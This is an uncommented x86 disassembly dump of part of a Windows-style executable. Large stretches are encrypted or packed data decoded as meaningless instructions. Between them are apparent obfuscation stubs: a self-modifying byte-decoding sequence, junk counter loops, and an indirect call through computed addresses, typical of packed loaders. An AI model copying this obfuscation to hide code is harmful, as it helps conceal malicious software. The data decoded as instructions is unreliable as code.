  40726d:	arpl   WORD PTR [ebx-0x24e37958],di
  407273:	in     eax,0x3
  407275:	push   0xffffffa0
  407277:	pinsrw mm7,edx,0x5e
  40727b:	dec    edi
  40727c:	arpl   sp,si
  40727e:	hlt    
  40727f:	pop    esp
  407280:	sub    ah,BYTE PTR [ecx]
  407282:	and    cl,BYTE PTR ds:0x6f45e653
  407288:	loopne 0x40725e
  40728a:	into   
  40728b:	push   esp
  40728c:	in     al,0x3c
  40728e:	mov    dh,0x3
  407290:	mov    WORD PTR [eax],es
  407292:	mov    al,0xd4
  407294:	mov    ebx,0x14b4a442
  407299:	mov    BYTE PTR ds:0x20155610,al
  40729f:	sbb    bl,al
  4072a1:	mov    ebp,0xb3a9e64b
  4072a6:	or     ecx,DWORD PTR [esi+edi*4+0x6b]
  4072aa:	and    WORD PTR [eax-0x65e9057b],cx
  4072b1:	pop    eax
  4072b2:	data16 repz mov ds:0x48c97b2d,al
  4072b9:	inc    edi
  4072ba:	sub    DWORD PTR [edi+0x7648c980],ebp
  4072c0:	xchg   eax,esp
  4072c2:	and    eax,0x3ac3e09e
  4072c7:	mov    ds:0x23f624c7,al
  4072cc:	in     al,dx
  4072cd:	mov    edx,0xf0e0e011
  4072d2:	push   ecx
  4072d3:	loopne 0x407285
  4072d5:	imul   esp,esi,0x64
  4072d8:	repnz pop esi
  4072da:	mov    DWORD PTR [eax-0x55f90680],ebp
  4072e0:	ret    0x2fd9
  4072e3:	add    eax,0x10b8b4ac
  4072e8:	ss pop ebx
  4072ea:	popf   
  4072eb:	cmp    BYTE PTR [edx+0x13f39671],bh
  4072f1:	fs mov ecx,0x958aaa17
  4072f7:	or     eax,0x8ebd8f7d
  4072fc:	retf   0x4342
  4072ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407300:	fsub   DWORD PTR [esi+edx*2+0x3a]
  407304:	or     DWORD PTR ds:0xbea85b78,ebp
  40730a:	rol    DWORD PTR [ecx+0x7a],cl
  40730d:	xchg   esp,eax
  40730e:	xchg   edx,eax
  40730f:	(bad)  
  407310:	dec    ebx
  407311:	ds daa 
  407313:	pop    es
  407314:	int3   
  407315:	js     0x40729e
  407317:	jnp    0x4072f9
  407319:	dec    ebx
  40731a:	int    0x92
  40731c:	pop    edi
  40731d:	dec    ebx
  40731e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40731f:	and    dl,BYTE PTR [edx]
  407321:	and    dl,al
  407323:	stos   DWORD PTR es:[edi],eax
  407324:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  407326:	aad    0x44
  407328:	es push es
  40732a:	into   
  40732b:	adc    eax,0xf6025b95
  407330:	add    al,0x5d
  407332:	or     al,0xba
  407334:	imul   edi,DWORD PTR [ebx+0x5],0x42c012c1
  40733b:	cli    
  40733c:	out    0xfc,eax
  40733e:	xchg   edi,eax
  40733f:	mov    al,0x82
  407341:	mov    ch,BYTE PTR [edi]
  407343:	fist   DWORD PTR [eax-0x37]
  407346:	sub    eax,0x65e1c84e
  40734b:	sub    edi,esp
  40734d:	pop    edi
  40734e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40734f:	and    cl,BYTE PTR [eax-0x5a]
  407352:	mov    dh,0x2
  407354:	arpl   WORD PTR [eax-0x8e2090c],si
  40735a:	pop    edi
  40735b:	mov    eax,ds:0xc95b8572
  407360:	gs stc 
  407362:	adc    BYTE PTR [edx-0x534c8d3d],bl
  407368:	mov    ebx,0xb74f1588
  40736d:	add    bh,0xf7
  407370:	xor    DWORD PTR [eax+0x187f73da],ebx
  407376:	xchg   edi,eax
  407377:	or     DWORD PTR [eax],0x40ad5d24
  40737d:	loop   0x407365
  40737f:	mov    esp,0xcccc8b3e
  407384:	lods   eax,DWORD PTR ds:[esi]
  407385:	or     DWORD PTR [edx*4-0x3b103acf],ebp
  40738c:	cli    
  40738d:	ins    DWORD PTR es:[edi],dx
  40738e:	call   0x98c0fedb
  407393:	add    DWORD PTR [eax],eax
  407395:	add    bh,bh
  407397:	xor    al,ch
  407399:	fstp   DWORD PTR [eax+eax*1+0x0]
  40739d:	mov    ecx,DWORD PTR [ebp-0x1c]
  4073a0:	xor    ecx,esi
  4073a2:	mov    eax,0xffcd8d64
  4073a7:	sub    eax,ecx
  4073a9:	sub    eax,DWORD PTR [ebp-0x8]
  4073ac:	mov    ecx,DWORD PTR [ebp-0x30]
  4073af:	add    ecx,eax
  4073b1:	mov    eax,DWORD PTR [ebp-0x8]
  4073b4:	mov    DWORD PTR [eax+0x1],ecx
  4073b7:	mov    al,BYTE PTR [ebp-0x1]
  4073ba:	mov    ecx,DWORD PTR [ebp-0x8]
  4073bd:	xor    al,0x47
  4073bf:	sub    al,0x37
  4073c1:	mov    BYTE PTR [ecx],al
  4073c3:	lea    eax,[ebp-0x8]
  4073c6:	inc    BYTE PTR [eax]
  4073c8:	inc    eax
  4073c9:	push   eax
  4073ca:	pop    ecx
  4073cb:	dec    ecx
  4073cc:	xchg   ecx,edx
  4073ce:	jmp    0x40771b
  4073d3:	sub    BYTE PTR [esi],ah
  4073d5:	cs cdq 
  4073d7:	cs mov cl,0xb3
  4073da:	mov    cl,0x3e
  4073dc:	sbb    ebp,edx
  4073de:	into   
  4073df:	push   edi
  4073e0:	or     eax,ebp
  4073e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073e3:	stos   DWORD PTR es:[edi],eax
  4073e4:	shl    DWORD PTR [eax+0x70],0x20
  4073e8:	jge    0x40745a
  4073ea:	jo     0x4073b3
  4073ec:	ror    BYTE PTR [eax-0x7b6ea463],0xd6
  4073f3:	sbb    al,0x18
  4073f5:	fcomp  st(4)
  4073f7:	adc    DWORD PTR [edi+0x4],0xffffffaa
  4073fb:	mov    ds:0xa0eebbe3,al
  407400:	test   eax,0x36acbbde
  407405:	mov    ebx,0x4e1e8ff6
  40740a:	sbb    eax,0xebdcd190
  40740f:	fnstenv [esi+0xd54bd94]
  407415:	sub    al,0x65
  407417:	or     eax,0xf55edcf5
  40741c:	data16 aad 0x30
  40741f:	xchg   edi,eax
  407420:	fiadd  WORD PTR ss:[edx-0x27]
  407424:	sbb    DWORD PTR [esi+0x46],esi
  407427:	test   ebp,ecx
  407429:	mov    ebx,0x7674ca09
  40742e:	inc    ebx
  40742f:	outs   dx,DWORD PTR ds:[esi]
  407430:	mov    DWORD PTR [ebx+edi*1],ecx
  407433:	jne    0x407461
  407435:	xchg   esi,eax
  407436:	int    0x0
  407438:	pop    esi
  407439:	mov    WORD PTR [edi+0x40fd06a5],ss
  40743f:	xor    BYTE PTR [edi+ebx*2-0x31],bl
  407443:	xor    al,0x49
  407445:	lea    esi,[edi+edx*8]
  407448:	retf   0x2fb9
  40744b:	lock jl 0x407453
  40744e:	pop    ecx
  40744f:	mov    fs,WORD PTR [ebp+0x7d]
  407452:	adc    ecx,DWORD PTR [ebp-0x4325374e]
  407458:	dec    esp
  407459:	push   edi
  40745a:	ficom  WORD PTR [ebx*2-0x6af0cd55]
  407461:	daa    
  407462:	xchg   esp,eax
  407463:	jecxz  0x407480
  407465:	jne    0x407408
  407467:	pop    esp
  407468:	mov    BYTE PTR [ebx+0x7b6129dc],cl
  40746e:	outs   dx,BYTE PTR ds:[esi]
  40746f:	js     0x4074c4
  407471:	cli    
  407472:	ja     0x4074c5
  407474:	dec    ebp
  407475:	fcomp  QWORD PTR [ebx-0x72e94b25]
  40747b:	(bad)  
  40747c:	int    0xa4
  40747e:	sti    
  40747f:	push   ecx
  407480:	clc    
  407481:	xor    al,0x67
  407483:	pop    esi
  407484:	scas   eax,DWORD PTR es:[edi]
  407485:	les    edi,FWORD PTR [eax+0x1b]
  407488:	jne    0x407419
  40748a:	(bad)  
  40748b:	repz ja 0x407417
  40748e:	add    dl,bl
  407490:	push   cs
  407491:	push   ds
  407492:	inc    ebp
  407493:	and    al,0x3c
  407495:	ret    0xdaf9
  407498:	out    dx,eax
  407499:	push   ebp
  40749a:	or     al,0xd1
  40749c:	inc    ebx
  40749d:	ja     0x4074f5
  40749f:	ret    
  4074a0:	sbb    ah,BYTE PTR [esp+edx*8-0xd3376a1]
  4074a7:	cmc    
  4074a8:	push   ebp
  4074a9:	sti    
  4074aa:	sub    eax,0xac2fde1e
  4074af:	test   BYTE PTR [eax+0x48268f7e],ch
  4074b5:	and    al,0x1b
  4074b7:	and    dl,bl
  4074b9:	pop    ss
  4074ba:	or     cl,BYTE PTR [edi+0x5a]
  4074bd:	sbb    BYTE PTR [ecx+0x5c7f7970],dl
  4074c3:	stos   DWORD PTR es:[edi],eax
  4074c4:	jo     0x4074f5
  4074c6:	add    DWORD PTR [edi-0x45],ebx
  4074c9:	jp     0x4074cb
  4074cb:	call   DWORD PTR [ebx+0x7b67b871]
  4074d1:	mov    ebx,0x425b518b
  4074d6:	into   
  4074d7:	pop    ebp
  4074d8:	or     eax,0xc12d990b
  4074dd:	and    BYTE PTR [edi+eax*2-0x62],dl
  4074e1:	jmp    0x407511
  4074e3:	gs aas 
  4074e5:	ss push esi
  4074e7:	es dec ebx
  4074e9:	inc    edx
  4074ea:	(bad)
  4074ef:	push   esi
  4074f0:	fs ret 
  4074f2:	xor    edi,edi
  4074f4:	in     al,dx
  4074f5:	push   eax
  4074f6:	xchg   edx,eax
  4074f7:	xchg   BYTE PTR [edx+0x1b],bh
  4074fa:	and    esi,DWORD PTR [esi-0x662bc43e]
  407500:	xchg   BYTE PTR [edx+0x11],bl
  407503:	push   ebp
  407504:	xor    ch,BYTE PTR [esi-0x38f22ec3]
  40750a:	ret    0xf395
  40750d:	mov    ebp,0xcbd6cb10
  407512:	call   0x41cb:0xbfbef5e5
  407519:	scas   eax,DWORD PTR es:[edi]
  40751a:	(bad)  
  40751b:	stos   DWORD PTR es:[edi],eax
  40751c:	mov    edi,0x61235d94
  407521:	add    eax,0x5375410c
  407526:	jge    0x4074a9
  407528:	jp     0x407598
  40752a:	sub    eax,0x8e12b8a2
  40752f:	mov    BYTE PTR [edi+0x1f3dfcb0],ah
  407535:	imul   ebx,DWORD PTR [edi-0x50],0x1e374a47
  40753c:	gs call 0x7469:0xa57501b2
  407544:	xor    DWORD PTR [edx+0x576eacf7],ebx
  40754a:	arpl   WORD PTR [eax-0x7af5b979],dx
  407550:	out    0x54,eax
  407552:	bsf    eax,DWORD PTR [edx-0x47]
  407556:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407557:	jl     0x4074e4
  407559:	ret    
  40755a:	xor    eax,0xcb31c4b9
  40755f:	nop
  407560:	retf   0x5971
  407563:	push   esi
  407564:	lods   eax,DWORD PTR ds:[esi]
  407565:	mov    ecx,0xf97b0069
  40756a:	add    dl,BYTE PTR [ebp+0x16]
  40756d:	fs aam 0xcb
  407570:	xchg   esp,eax
  407571:	and    ebp,DWORD PTR [ecx-0x524e9de9]
  407577:	pushf  
  407578:	mov    cs,WORD PTR [eax-0x65bb026e]
  40757e:	loope  0x4075ae
  407580:	es jnp 0x407539
  407583:	hlt    
  407584:	xchg   edi,eax
  407585:	xor    BYTE PTR [eax+0x14bed37d],bh
  40758b:	pop    ebp
  40758c:	ss sahf 
  40758e:	dec    ebx
  40758f:	out    dx,eax
  407590:	shr    BYTE PTR ds:0xb2c3c553,cl
  407596:	mov    bl,0x2e
  407598:	test   al,0xed
  40759a:	jb     0x4075b8
  40759c:	or     ch,bh
  40759e:	push   eax
  40759f:	fsub   QWORD PTR [ecx+ebx*2]
  4075a2:	(bad)  
  4075a3:	pextrw edi,(bad),0xc5
  4075a5:	jp     0x407597
  4075a7:	add    DWORD PTR [edi-0x6022151f],edx
  4075ad:	inc    ebp
  4075ae:	jnp    0x40753c
  4075b0:	and    ecx,DWORD PTR [edx]
  4075b2:	or     al,0xeb
  4075b4:	dec    edi
  4075b5:	fs mov al,0x7c
  4075b8:	mov    ecx,0x99d4a7bf
  4075bd:	cli    
  4075be:	lods   al,BYTE PTR ds:[esi]
  4075bf:	mov    ebp,0xb63e3226
  4075c4:	push   ebp
  4075c5:	push   ds
  4075c6:	popf   
  4075c7:	add    eax,DWORD PTR [esi]
  4075c9:	add    eax,0x8d13e182
  4075ce:	cmp    BYTE PTR [eax],0x97
  4075d1:	push   0xffffff9f
  4075d3:	test   edx,eax
  4075d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075d6:	dec    esi
  4075d7:	dec    eax
  4075d8:	cmp    BYTE PTR [esi+0x63],dh
  4075db:	ss and cl,al
  4075de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075df:	mov    ebx,0xc047dd7d
  4075e4:	push   cs
  4075e5:	call   0x614345c9
  4075ea:	push   ebp
  4075eb:	push   es
  4075ec:	stos   BYTE PTR es:[edi],al
  4075ed:	jne    0x4075af
  4075ef:	mov    dh,0xae
  4075f1:	fs aam 0x5a
  4075f4:	xlat   BYTE PTR ds:[ebx]
  4075f5:	adc    DWORD PTR [ecx+0x1d],ebx
  4075f8:	dec    edx
  4075f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075fa:	je     0x4075be
  4075fc:	pop    ds
  4075fd:	xchg   edx,eax
  4075fe:	loop   0x40758e
  407600:	enterw 0x5254,0x99
  407605:	repz aad 0x94
  407608:	punpckhdq mm5,mm1
  40760b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40760c:	rcl    BYTE PTR [edx-0x33],cl
  40760f:	enter  0xc6e9,0xc4
  407613:	cmp    al,0xfd
  407615:	fwait
  407616:	pop    esi
  407617:	mov    cl,0xb4
  407619:	or     BYTE PTR [ebx-0x2a],cl
  40761c:	xor    BYTE PTR [ebx+0x4e],al
  40761f:	pushf  
  407620:	int3   
  407621:	lea    edi,gs:[ecx-0x4]
  407625:	mov    bl,0xdf
  407627:	mov    esp,0x6a6d9c28
  40762c:	in     eax,dx
  40762d:	or     eax,0x41a132c8
  407632:	dec    eax
  407633:	and    esi,DWORD PTR [ebx+0x5b]
  407636:	loopne 0x407652
  407638:	mov    edi,0x21536fad
  40763d:	fnstsw WORD PTR [esi-0x64]
  407640:	jecxz  0x4076a1
  407642:	jo     0x4075f1
  407644:	jmp    0x9897:0xa900664d
  40764b:	mov    ss,WORD PTR fs:[edx]
  40764e:	daa    
  40764f:	adc    ebx,eax
  407651:	(bad)  
  407652:	xlat   BYTE PTR ds:[ebx]
  407653:	shl    DWORD PTR [ecx+ebx*8+0x33],cl
  407657:	push   ss
  407658:	std    
  407659:	pop    esi
  40765a:	(bad)  
  40765b:	call   0x6d6:0xb646d9e6
  407662:	lea    esi,ds:0x3ce8daaf
  407668:	push   0xa9ff3039
  40766d:	sub    BYTE PTR [edx],bl
  40766f:	dec    ecx
  407670:	fisttp QWORD PTR [edi]
  407672:	xchg   edi,eax
  407673:	jg     0x4076d9
  407675:	jecxz  0x40762c
  407677:	out    0x31,al
  407679:	push   cs
  40767a:	stc    
  40767b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40767c:	xchg   esi,eax
  40767d:	xchg   ebp,eax
  40767e:	push   0x7b
  407680:	adc    al,BYTE PTR [ebx]
  407682:	les    ebx,FWORD PTR [ebx+0x503756e5]
  407688:	xchg   ebx,eax
  407689:	cmc    
  40768a:	xchg   edx,eax
  40768b:	loopne 0x407699
  40768d:	cli    
  40768e:	stc    
  40768f:	cmp    eax,0xa7f581
  407694:	int    0x2a
  407696:	push   es
  407697:	jecxz  0x407672
  407699:	mov    DWORD PTR [esi-0x6],esp
  40769c:	popf   
  40769d:	pushf  
  40769e:	mov    dh,0x60
  4076a0:	and    al,0x10
  4076a2:	and    ebx,0x15
  4076a5:	(bad)  
  4076a6:	dec    eax
  4076a7:	shl    DWORD PTR [ebx],1
  4076a9:	cmp    BYTE PTR [edi-0x16],0xf4
  4076ad:	ret    0xd8e6
  4076b0:	ret    
  4076b1:	push   eax
  4076b2:	or     DWORD PTR [ebp-0x38],esi
  4076b5:	xchg   edi,eax
  4076b6:	xor    ebp,esp
  4076b8:	fild   QWORD PTR [edi-0x40]
  4076bb:	dec    ebp
  4076bc:	pop    edi
  4076bd:	in     al,dx
  4076be:	jecxz  0x40768f
  4076c0:	mov    esp,0x33d0338b
  4076c5:	(bad)  
  4076c6:	aaa    
  4076c7:	adc    DWORD PTR [ecx+0x7b70f27d],0x38ffb0e
  4076d1:	jmp    0xc9003eb6
  4076d6:	sbb    cl,al
  4076d8:	imul   ecx,DWORD PTR [esi-0x6613e3f8],0xffffff9a
  4076df:	(bad)  
  4076e0:	int    0xa5
  4076e2:	int    0x62
  4076e4:	jmp    0xfcc8:0xbc602c23
  4076eb:	sbb    edi,DWORD PTR [edx]
  4076ed:	lds    esp,FWORD PTR [ebx+0x6a]
  4076f0:	push   ecx
  4076f1:	xor    BYTE PTR [esi],dh
  4076f3:	loop   0x407686
  4076f5:	jecxz  0x40767d
  4076f7:	push   eax
  4076f8:	mov    esi,0x82a55a4d
  4076fd:	mov    cl,0xe
  4076ff:	sti    
  407700:	(bad)
  407703:	ss (bad) 
  407705:	sub    eax,0xeaabe18f
  40770a:	pop    es
  40770b:	xor    edx,DWORD PTR [edx-0x477f4dd0]
  407711:	mov    BYTE PTR [ebx*1-0x51e3a36],cl
  407718:	lds    esp,FWORD PTR [eax-0xf50158]
  40771e:	jne    0x407710
  407720:	mov    eax,ds:0x41625c
  407725:	mov    eax,DWORD PTR [eax]
  407727:	push   DWORD PTR [eax]
  407729:	lea    eax,ds:0x416278
  40772f:	push   DWORD PTR [eax]
  407731:	lea    eax,ds:0x416024
  407737:	push   DWORD PTR [eax]
  407739:	lea    eax,ds:0x416258
  40773f:	push   DWORD PTR [eax]
  407741:	lea    eax,ds:0x4162e0
  407747:	push   DWORD PTR [eax]
  407749:	xchg   ebx,edx
  40774b:	inc    ebx
  40774c:	inc    ebx
  40774d:	sub    ebx,0x3
  407750:	push   ebx
  407751:	pop    eax
  407752:	call   DWORD PTR [eax+0x1]
  407755:	mov    eax,DWORD PTR [ebp-0x20]
  407758:	mov    ecx,DWORD PTR ds:0x41621c
  40775e:	add    DWORD PTR [eax],ecx
  407760:	pop    edi
  407761:	pop    esi
  407762:	pop    ebx
  407763:	leave  
  407764:	ret    
  407765:	push   ebp
  407766:	mov    ebp,esp
  407768:	sub    esp,0x44
  40776b:	push   edi
  40776c:	sbb    DWORD PTR ds:0x434419,edx
  407772:	mov    eax,DWORD PTR [ebp+0xc]
  407775:	mov    edx,DWORD PTR ds:0x432e64
  40777b:	mov    edi,DWORD PTR ds:0x434449
  407781:	sub    edx,edi
  407783:	xor    edx,DWORD PTR [edx+edi*1]
  407786:	mov    DWORD PTR [ebp-0x10],eax
  407789:	adc    DWORD PTR ds:0x432de6,edx
  40778f:	mov    eax,DWORD PTR [ebp+0x8]
  407792:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  407799:	sub    ecx,DWORD PTR ds:0x434366
  40779f:	mov    DWORD PTR [ebp-0x20],0xf89c8530
  4077a6:	mov    edx,DWORD PTR [ebp+0x8]
  4077a9:	and    DWORD PTR ds:0x4326ec,0x0
  4077b3:	xor    edi,edi
  4077b5:	add    edi,DWORD PTR ds:0x4326ec
  4077bb:	inc    edi
  4077bc:	mov    DWORD PTR ds:0x4326ec,edi
  4077c2:	cmp    DWORD PTR ds:0x4326ec,0xb
  4077c9:	jne    0x4077e2
  4077cf:	push   DWORD PTR [ebp-0x14]
  4077d2:	push   0x178d
  4077d7:	push   0x434421
  4077dc:	call   DWORD PTR ds:0x4329ca
  4077e2:	cmp    DWORD PTR ds:0x4326ec,0xa
  4077e9:	jne    0x4077fe
  4077ef:	xor    edi,edi
  4077f1:	add    edi,DWORD PTR ds:0x4326ec
  4077f7:	inc    edi
  4077f8:	mov    DWORD PTR ds:0x4326ec,edi
  4077fe:	cmp    DWORD PTR ds:0x4326ec,0x1b
  407805:	jb     0x4077b3
  40780b:	mov    DWORD PTR [ebp-0x40],eax
  40780e:	mov    eax,0x7510855
  407813:	or     edi,edi
  407815:	xor    edx,eax
  407817:	mov    ecx,0x32729c
  40781c:	adc    DWORD PTR ds:0x432dde,edi
  407822:	add    edx,ecx
  407824:	mov    edi,DWORD PTR ds:0x43436e
  40782a:	or     DWORD PTR ds:0x4326fc,edi
  407830:	mov    DWORD PTR [ebp-0x8],edx
  407833:	adc    DWORD PTR ds:0x434415,ecx
  407839:	mov    edx,DWORD PTR [ebp+0x8]
  40783c:	sbb    DWORD PTR ds:0x432700,0x434392
  407846:	xor    edx,eax
  407848:	add    edx,ecx
  40784a:	mov    edi,DWORD PTR ds:0x4326ec
  407850:	or     edi,DWORD PTR ds:0x4326f0
  407856:	mov    DWORD PTR ds:0x4326ec,edi
  40785c:	mov    DWORD PTR [ebp+0xc],edx
  40785f:	inc    edi
  407860:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  407867:	mov    DWORD PTR ds:0x434425,0x1e
  407871:	cmp    DWORD PTR ds:0x434425,0x0
  407878:	je     0x407aca
  40787e:	cmp    DWORD PTR ds:0x434425,0x22
  407885:	jne    0x407891
  40788b:	call   DWORD PTR ds:0x432cf6
  407891:	xor    edi,edi
  407893:	add    edi,DWORD PTR ds:0x434425
  407899:	dec    edi
  40789a:	mov    DWORD PTR ds:0x434425,edi
  4078a0:	jmp    0x407871
  4078a5:	mov    edx,DWORD PTR ds:0x4343a6
  4078ab:	mov    edi,DWORD PTR ds:0x434469
  4078b1:	sub    edx,edi
  4078b3:	add    edx,DWORD PTR [edx+edi*1]
  4078b6:	jmp    0x407aca
  4078bb:	fldcw  WORD PTR [eax+0x3e]
  4078be:	cs push ecx
  4078c0:	mov    dh,0xe9
  4078c2:	jae    0x407865
  4078c4:	shl    DWORD PTR [edi+0x64],cl
  4078c7:	ins    BYTE PTR es:[edi],dx
  4078c8:	xor    eax,0xce5b25c2
  4078cd:	jo     0x40793f
  4078cf:	imul   edi,DWORD PTR [edi+0x70],0x66549270
  4078d6:	sub    eax,0x9d493f6d
  4078db:	cdq    
  4078dc:	mov    ebx,0xde4d6dc7
  4078e1:	rcl    edi,1
  4078e3:	dec    edi
  4078e4:	(bad)  [ecx-0x4d0f4fe8]
  4078ea:	mov    ah,0x79
  4078ec:	jb     0x4078b4
  4078ee:	jnp    0x4078c6
  4078f0:	xor    BYTE PTR ds:0x7a5b14ec,bl
  4078f6:	pop    edx
  4078f7:	add    al,0xd5
  4078f9:	test   al,0xb6
  4078fb:	inc    ecx
  4078fc:	push   0x39e663ab
  407901:	out    dx,eax
  407902:	dec    edi
  407903:	lea    edi,[ecx]
  407905:	xor    al,0x1c
  407907:	aam    0xf9
  407909:	out    dx,eax
  40790a:	xor    DWORD PTR [edx+ebx*8-0x4e],edx
  40790e:	stos   DWORD PTR es:[edi],eax
  40790f:	adc    DWORD PTR [ecx+0x3c],0xe66601ce
  407916:	les    esp,FWORD PTR [esi+0x6f]
  407919:	pop    ds
  40791a:	mov    ecx,0xba487e3
  40791f:	cmp    DWORD PTR [edx],esi
  407921:	sub    al,0x52
  407923:	(bad)  
  407924:	out    0x82,al
  407926:	push   ss
  407927:	sbb    dl,bh
  407929:	mov    ds:0x9608dc14,eax
  40792e:	push   edi
  40792f:	leave  
  407930:	xor    al,bh
  407932:	pop    ss
  407933:	and    eax,0x9d37d3ae
  407938:	push   ebx
  407939:	int    0x6e
  40793b:	or     eax,0xbc467121
  407940:	in     al,0x8c
  407942:	xor    BYTE PTR [edx+0x4a],dl
  407945:	loope  0x4078ef
  407947:	or     BYTE PTR [edi],dl
  407949:	shl    BYTE PTR [esi+0x8e15e2b],0xa1
  407950:	adc    eax,0x8c3f1e0d
  407955:	cwde   
  407956:	jne    0x40794b
  407958:	je     0x407949
  40795a:	imul   esi,esp,0x94f4a7b7
  407960:	ret    0xfa3f
  407963:	jo     0x407950
  407965:	fdivp  st(0),st
  407967:	jns    0x40795d
  407969:	lea    edi,[esi]
  40796b:	mov    ebp,0x387d1847
  407970:	clc    
  407971:	push   ebp
  407972:	retf   0xcfb4
  407975:	lds    esi,FWORD PTR [ebx+0x2fc8f372]
  40797b:	xchg   ecx,eax
  40797c:	xchg   BYTE PTR [edx-0x6fbe6124],cl
  407982:	adc    DWORD PTR [ebp-0x4f1b9dd1],ecx
  407988:	mov    WORD PTR [edi-0x5b],?
  40798b:	daa    
  40798c:	dec    ebx
  40798d:	into   
  40798e:	mov    dl,0x6a
  407990:	mov    ah,0x87
  407992:	adc    al,0xef
  407994:	push   ebx
  407995:	and    ecx,DWORD PTR [ebx]
  407997:	popf   
  407998:	jbe    0x407a01
  40799a:	popa   
  40799b:	scas   al,BYTE PTR es:[edi]
  40799c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40799d:	das    
  40799e:	in     eax,dx
  40799f:	xchg   esp,eax
  4079a0:	sbb    DWORD PTR [esp+ebp*1],ebx
  4079a3:	xor    BYTE PTR [edi+0x11],bl
  4079a6:	xor    bh,BYTE PTR ds:0x73afb1ae
  4079ac:	ja     0x4079e6
  4079ae:	jecxz  0x407947
  4079b0:	jp     0x40797c
  4079b2:	inc    ebx
  4079b3:	sub    eax,0x6b5d00bf
  4079b8:	(bad)  
  4079b9:	dec    edx
  4079ba:	push   ds
  4079bb:	xor    esi,DWORD PTR [eax]
  4079bd:	into   
  4079be:	xchg   ebp,eax
  4079bf:	dec    edi
  4079c0:	jl     0x407a36
  4079c2:	cmc    
  4079c3:	sub    DWORD PTR ds:0xd4b737c3,0xffffffff
  4079ca:	dec    esp
  4079cb:	xchg   esi,eax
  4079cc:	js     0x407a44
  4079ce:	inc    ebp
  4079cf:	jle    0x407984
  4079d1:	loop   0x4079d1
  4079d3:	retf   0xd7ce
  4079d6:	das    
  4079d7:	and    eax,0x1f3fe319
  4079dc:	add    eax,0xe680ead4
  4079e1:	aas    
  4079e2:	je     0x407979
  4079e4:	in     eax,dx
  4079e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079e6:	ja     0x4079fa
  4079e8:	ja     0x407a11
  4079ea:	rol    DWORD PTR [edi],0x4f
  4079ed:	sub    al,0x6
  4079ef:	sub    esi,DWORD PTR [ecx]
  4079f1:	cwde   
  4079f2:	not    DWORD PTR [ebx-0x7f85d98b]
  4079f8:	pop    ss
  4079f9:	leave  
  4079fa:	push   ss
  4079fb:	pop    ecx
  4079fc:	push   ds
  4079fd:	push   ebx
  4079fe:	test   BYTE PTR [edi],ch
  407a00:	fcomp  st(2)
  407a02:	iret   
  407a03:	data16 jb 0x4079e3
  407a06:	sub    al,0xf8
  407a08:	cmp    cl,bh
  407a0a:	adc    eax,0x4d169409
  407a0f:	mov    eax,ds:0xda2f9203
  407a14:	aas    
  407a15:	sbb    dh,BYTE PTR [edi-0x3e3ef764]
  407a1b:	fisub  WORD PTR ds:0x266b1c06
  407a21:	cmp    dh,BYTE PTR [esi+0x7b]
  407a24:	add    edi,DWORD PTR [eax-0x2e3b4bfc]
  407a2a:	xlat   BYTE PTR ds:[ebx]
  407a2b:	cmp    dl,BYTE PTR [esi-0x30]
  407a2e:	es jbe 0x4079fb
  407a31:	xchg   edi,eax
  407a32:	mov    al,ds:0x4364943b
  407a37:	jecxz  0x407a36
  407a39:	mov    ds:0x8272212,al
  407a3e:	ror    BYTE PTR [esp+esi*2+0x44],1
  407a42:	outs   dx,BYTE PTR ds:[esi]
  407a43:	jnp    0x407a57
  407a45:	add    dh,BYTE PTR [edi+0x32]
  407a48:	ds dec ebx
  407a4a:	js     0x407a7a
  407a4c:	cli    
  407a4d:	add    eax,0x77058962
  407a52:	dec    ecx
  407a53:	call   FWORD PTR [eax]
  407a55:	pop    ss
  407a56:	jno    0x4079e0
  407a58:	fdivp  st(7),st
  407a5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a5b:	jns    0x407a27
  407a5d:	aaa    
  407a5e:	cmp    ch,bh
  407a60:	push   es
  407a61:	ja     0x4079e4
  407a63:	xchg   DWORD PTR ds:0xafcd7ccb,ebx
  407a69:	adc    eax,ebp
  407a6b:	popf   
  407a6c:	jle    0x407a6b
  407a6e:	xchg   esi,eax
  407a6f:	out    dx,al
  407a70:	push   ds
  407a71:	mov    al,ds:0xb771a9da
  407a76:	shl    DWORD PTR [esi+ebp*1],1
  407a79:	mov    dh,0x8
  407a7b:	popf   
  407a7c:	jle    0x407a0d
  407a7e:	es mov esp,0xf97bd8d6
  407a84:	bound  esp,QWORD PTR [edx-0x4296a88]
  407a8a:	mov    DWORD PTR [eax+0x4c],edx
  407a8d:	cmp    al,0x28
  407a8f:	(bad)  
  407a91:	aad    0xdd
  407a93:	dec    edx
  407a94:	jb     0x407abf
  407a96:	add    eax,esi
  407a98:	cs ja  0x407ac5
  407a9b:	(bad)  
  407a9d:	cmp    ebp,DWORD PTR [edx+edx*4-0x78]
  407aa1:	jmp    0x53e53370
  407aa6:	or     DWORD PTR [esi+0x1b15665d],edx
  407aac:	jno    0x407a71
  407aae:	xor    edx,esi
  407ab0:	jmp    0x6d0b:0x9467646b
  407ab7:	loope  0x407ad1
  407ab9:	mov    esp,0x86df3e1b
  407abe:	inc    ebx
  407abf:	out    0x10,al
  407ac1:	add    BYTE PTR [edx],ah
  407ac3:	outs   dx,DWORD PTR ds:[esi]
  407ac4:	inc    edi
  407ac5:	inc    eax
  407ac7:	int3   
  407ac8:	das    
  407ac9:	int3   
  407aca:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  407ad1:	add    edx,DWORD PTR ds:0x432dce
  407ad7:	mov    DWORD PTR [ebp-0x2c],0xf89c8532
  407ade:	mov    edi,DWORD PTR ds:0x43436a
  407ae4:	sub    DWORD PTR ds:0x434372,edi
  407aea:	mov    DWORD PTR [ebp-0x30],0xf89c853d
